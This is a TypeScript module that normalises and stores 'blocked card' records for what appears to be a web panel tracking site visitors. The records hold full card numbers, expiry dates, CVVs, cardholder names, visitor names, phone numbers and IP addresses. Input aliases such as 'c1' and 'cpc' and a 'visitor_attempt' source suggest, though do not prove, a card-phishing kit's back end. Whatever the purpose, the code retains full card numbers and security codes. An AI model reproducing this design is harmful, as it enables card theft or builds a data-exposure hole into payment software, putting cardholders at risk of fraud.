import { randomUUID } from "node:crypto";

export interface StoredBlockedCard {
  id: string;
  bin: string;
  cardNumber?: string;
  last4?: string;
  expiryMonth?: string;
  expiryYear?: string;
  cvv?: string;
  cardName?: string;
  cardType?: string;
  bankName?: string;
  visitorId?: string;
  visitorName?: string;
  phone?: string;
  ip?: string;
  source: "admin_block" | "visitor_attempt" | "manual";
  blockedAt: string;
}

const MAX_STORED_BLOCKED_CARDS = 1000;

export function extractCardBin(value: unknown): string {
  const digits = String(value ?? "").replace(/\D/g, "");
  return digits.length >= 6 ? digits.slice(0, 6) : "";
}

function cleanDigits(value: unknown, maxLen: number): string | undefined {
  const digits = String(value ?? "").replace(/\D/g, "").slice(0, maxLen);
  return digits || undefined;
}

function cleanText(value: unknown, maxLen: number): string | undefined {
  const s = String(value ?? "").trim().slice(0, maxLen);
  return s || undefined;
}

export function normalizeBlockedCardInput(
  raw: any,
  defaults?: Partial<StoredBlockedCard>,
): StoredBlockedCard | null {
  const rawCard = cleanDigits(raw?.cardNumber ?? raw?.c1 ?? defaults?.cardNumber, 19);
  const bin = extractCardBin(raw?.bin ?? rawCard ?? defaults?.bin);
  if (bin.length !== 6) return null;

  const fullCardNumber = rawCard && rawCard.length > 6 ? rawCard : undefined;
  const last4 =
    cleanDigits(raw?.last4 ?? defaults?.last4, 4) ||
    (fullCardNumber && fullCardNumber.length >= 10
      ? fullCardNumber.slice(-4)
      : undefined);

  const sourceRaw = raw?.source ?? defaults?.source;
  const source: StoredBlockedCard["source"] =
    sourceRaw === "visitor_attempt" || sourceRaw === "admin_block" || sourceRaw === "manual"
      ? sourceRaw
      : "manual";

  return {
    id: cleanText(raw?.id, 80) || `blk_${randomUUID()}`,
    bin,
    ...(fullCardNumber ? { cardNumber: fullCardNumber } : {}),
    ...(last4 ? { last4 } : {}),
    ...(cleanDigits(raw?.expiryMonth ?? defaults?.expiryMonth, 2)
      ? { expiryMonth: cleanDigits(raw?.expiryMonth ?? defaults?.expiryMonth, 2) }
      : {}),
    ...(cleanDigits(raw?.expiryYear ?? defaults?.expiryYear, 4)
      ? { expiryYear: cleanDigits(raw?.expiryYear ?? defaults?.expiryYear, 4) }
      : {}),
    ...(cleanDigits(raw?.cvv ?? raw?.cpc ?? defaults?.cvv, 4)
      ? { cvv: cleanDigits(raw?.cvv ?? raw?.cpc ?? defaults?.cvv, 4) }
      : {}),
    ...(cleanText(raw?.cardName ?? defaults?.cardName, 120)
      ? { cardName: cleanText(raw?.cardName ?? defaults?.cardName, 120) }
      : {}),
    ...(cleanText(raw?.cardType ?? defaults?.cardType, 40)
      ? { cardType: cleanText(raw?.cardType ?? defaults?.cardType, 40) }
      : {}),
    ...(cleanText(raw?.bankName ?? raw?.cardBankName ?? defaults?.bankName, 120)
      ? { bankName: cleanText(raw?.bankName ?? raw?.cardBankName ?? defaults?.bankName, 120) }
      : {}),
    ...(cleanText(raw?.visitorId ?? defaults?.visitorId, 100)
      ? { visitorId: cleanText(raw?.visitorId ?? defaults?.visitorId, 100) }
      : {}),
    ...(cleanText(raw?.visitorName ?? raw?.name ?? defaults?.visitorName, 120)
      ? { visitorName: cleanText(raw?.visitorName ?? raw?.name ?? defaults?.visitorName, 120) }
      : {}),
    ...(cleanText(raw?.phone ?? defaults?.phone, 30)
      ? { phone: cleanText(raw?.phone ?? defaults?.phone, 30) }
      : {}),
    ...(cleanText(raw?.ip ?? defaults?.ip, 64)
      ? { ip: cleanText(raw?.ip ?? defaults?.ip, 64) }
      : {}),
    source,
    blockedAt: cleanText(raw?.blockedAt ?? defaults?.blockedAt, 64) || new Date().toISOString(),
  };
}

export function upsertBlockedCardRecord(
  existingList: StoredBlockedCard[],
  incoming: StoredBlockedCard,
): StoredBlockedCard[] {
  const list = Array.isArray(existingList) ? [...existingList] : [];
  const idx = list.findIndex((item) => {
    if (incoming.cardNumber && item.cardNumber) {
      return (
        item.cardNumber === incoming.cardNumber &&
        (item.visitorId || "") === (incoming.visitorId || "") &&
        item.source === incoming.source
      );
    }
    return (
      !incoming.cardNumber &&
      !item.cardNumber &&
      item.bin === incoming.bin &&
      item.source === incoming.source
    );
  });

  if (idx !== -1) {
    const prev = list[idx];
    list[idx] = {
      ...prev,
      ...incoming,
      id: prev.id,
    };
    return list;
  }

  return [incoming, ...list].slice(0, MAX_STORED_BLOCKED_CARDS);
}
